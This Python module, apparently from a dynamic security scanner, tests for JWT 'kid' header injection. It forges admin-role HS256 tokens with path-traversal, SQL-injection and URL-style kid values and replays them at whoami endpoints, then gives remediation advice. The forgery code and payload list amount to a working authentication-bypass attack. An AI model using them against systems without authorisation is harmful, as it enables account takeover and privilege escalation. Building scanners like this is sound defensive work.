#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
JWT `kid` (key id) header injection.

The `kid` header tells a JWT verifier which key to use. If the
verifier interprets the value as a filesystem path, a SQL
identifier, or a URL, the attacker can either:
  - Path-traverse to a known-content file (e.g. `/dev/null` --
    empty content, then HMAC-sign with the empty key).
  - Sql-inject (`x' UNION SELECT 'AAA' --`) and then HMAC with
    `AAA`.
  - jku-style: point at an attacker-controlled JWKS URL.

This probe forges JWTs with each of those `kid` shapes and a
recognisable email claim, then sends them to common whoami
endpoints. The marker email round-tripping confirms the bug.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

WHOAMI_PATHS = (
    "/rest/user/whoami",
    "/api/me",
    "/api/users/me",
    "/me",
    "/api/v1/me",
    "/profile",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _forge(kid: str, email: str, hmac_key: bytes) -> str:
    """Forge a JWT with the supplied kid and HS256 signature using
    the supplied key."""
    header = _b64url(json.dumps(
        {"alg": "HS256", "typ": "JWT", "kid": kid},
        separators=(",", ":")).encode())
    payload = _b64url(json.dumps(
        {"email": email,
         "data": {"email": email, "role": "admin"},
         "role": "admin",
         "iat": 0},
        separators=(",", ":")).encode())
    signing_input = f"{header}.{payload}".encode()
    sig = hmac.new(hmac_key, signing_input,
                    hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64url(sig)}"


class JwtKidInjectionProbe(Probe):
    name = "auth_jwt_kid_injection"
    summary = ("Detects JWT `kid` header injection by forging "
               "tokens with path-traversal / SQL-injection / URL "
               "kid values and replaying them at common whoami "
               "endpoints.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--whoami-path", action="append", default=[],
            help="Additional 'identify-self' path. Repeatable.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(WHOAMI_PATHS) + list(args.whoami_path or [])

        marker = f"jwt-kid-{secrets.token_hex(6)}@dast.test"

        # Each forge variant: (kid_value, hmac_key) — when the
        # server fetches the kid as a filesystem path, the result is
        # the empty key (b''); when it SQL-injects a known-value
        # union-select, the key is whatever value we union-select.
        forge_variants = [
            ("/dev/null",                              b""),
            ("../../../../../../dev/null",             b""),
            ("../../../../../../etc/hosts",            b""),    # may be present but content varies
            ("' UNION SELECT 'AAA' -- ",               b"AAA"),
            ("x' UNION SELECT 'YWFh' -- ",             b"aaa"),
            (f"http://dast-jku-{secrets.token_hex(6)}.example/key",
                                                       b""),
        ]

        attempts: list[dict] = []
        confirmed: dict | None = None
        for kid_value, hkey in forge_variants:
            token = _forge(kid_value, marker, hkey)
            for p in paths:
                url = urljoin(origin, p)
                r = client.request("GET", url, headers={
                    "Authorization": f"Bearer {token}"})
                row: dict = {"kid": kid_value, "path": p,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body and marker in r.text:
                    row.update({"marker_echoed": True,
                                "snippet": (r.text or "")[:200]})
                    confirmed = row
                    attempts.append(row)
                    break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "marker": marker,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(
                    f"Confirmed: JWT kid-header injection at "
                    f"{origin}{confirmed['path']} -- a forged token "
                    f"with kid `{confirmed['kid']}` was accepted, "
                    f"and the marker {marker!r} appeared in the "
                    "response. The verifier resolves the kid value "
                    "(filesystem / SQL / URL) without validation."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Treat `kid` as opaque -- it must NEVER be passed "
                    "to a path / query / URL fetch.\n"
                    "  - Maintain a server-side allowlist of valid "
                    "kid values mapped to keys; refuse anything not "
                    "in the allowlist.\n"
                    "  - If you rotate keys via the kid, the value "
                    "must be a fixed-format identifier (UUID, "
                    "integer) and the lookup is a dict access, not a "
                    "filesystem read.\n"
                    "  - Pin the algorithm to your real one (RS256 / "
                    "ES256) at verify time; refuse HS256 from clients "
                    "if you sign with RSA/EC.\n"
                    "Rotate every key whose id was exposed during "
                    "the window."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: forged {len(forge_variants)} kid "
                     f"variants on {origin}; none echoed the marker "
                     "email at any whoami endpoint."),
            evidence=evidence,
        )


if __name__ == "__main__":
    JwtKidInjectionProbe().main()
